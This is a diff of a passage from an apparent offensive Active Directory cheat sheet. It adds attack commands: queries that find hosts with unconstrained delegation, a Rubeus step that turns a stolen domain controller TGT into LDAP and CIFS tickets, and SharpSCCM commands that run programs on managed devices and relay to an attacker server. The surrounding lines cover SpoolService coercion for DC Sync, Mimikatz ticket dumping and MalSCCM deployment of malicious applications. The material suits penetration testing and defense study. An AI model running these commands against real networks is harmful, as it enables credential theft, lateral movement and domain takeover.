@@ -3422,6 +3422,9 @@ If we compromise the bastion we get `Domain Admins` privileges on the other doma
 
 :warning: Unconstrained delegation used to be the only option available in Windows 2000
 
+> **Warning**
+> Remember to coerce to a HOSTNAME if you want a Kerberos Ticket
+
 #### SpoolService Abuse with Unconstrained Delegation
 
 The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.
@@ -3436,7 +3439,7 @@ The goal is to gain DC Sync privileges using a computer account and the SpoolSer
 ##### Find delegation
 
 :warning: : Domain controllers usually have unconstrained delegation enabled.    
-Check the `TrustedForDelegation` property.
+Check the `TRUSTED_FOR_DELEGATION` property.
 
 * [ADModule](https://github.com/samratashok/ADModule)
   ```powershell
@@ -3454,6 +3457,9 @@ Check the `TrustedForDelegation` property.
   ```powershell
   cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation
   ```
+
+* BloodHound: `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c`
+* Powershell Active Directory module: `Get-ADComputer -LDAPFilter "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -Properties DNSHostName,userAccountControl`
 
 ##### SpoolService status
 
@@ -3499,7 +3505,7 @@ If the attack worked you should get a TGT of the domain controller.
 Extract the base64 TGT from Rubeus output and load it to our current session.
 
 ```powershell
-.\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
+.\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
 ```
 
 Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`
@@ -3768,6 +3774,13 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
 * [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)
 * [MalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage](https://github.com/nettitude/MalSCCM)
 
+
+* Using **SharpSCCM**
+  ```ps1
+  .\SharpSCCM.exe get device --server <SERVER8NAME> --site-code <SITE_CODE>
+  .\SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
+  .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
+  ``` 
 * Compromise client, use locate to find management server 
     ```ps1
     MalSCCM.exe locate
@@ -3837,6 +3850,7 @@ python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th 
     Get-Acl C:\Windows\System32\wbem\Repository\OBJECTS.DATA | Format-List -Property PSPath,sddl
     ConvertFrom-SddlString ""
     ```
+
 
 ### SCCM Shares
 
